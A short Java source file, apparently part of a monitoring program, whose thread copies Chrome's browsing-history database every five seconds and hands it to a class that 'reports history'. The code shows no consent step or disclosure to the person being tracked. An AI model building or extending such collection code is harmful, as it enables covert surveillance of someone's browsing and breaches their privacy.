package com.company.local.WEB;

import com.company.utils.Config;
import com.company.utils.Files;

import java.io.IOException;

public class WebHistory extends Thread{

    @Override
    public void run() {
        while (true)
        {
            try {
                System.out.println("copying db and reporting history");
                Files.copyFile(Chrome.chromeDbPath, Config.properties.getProperty("DIRECTORY_NAME")+ Config.properties.getProperty("CHROME_COPIED_DB"));
                new Chrome().run();
            } catch (IOException e) {
                System.out.println(e.toString());
            }
            try {
                sleep(5 * 1000);
            } catch (InterruptedException ignored) {}
        }

    }
}
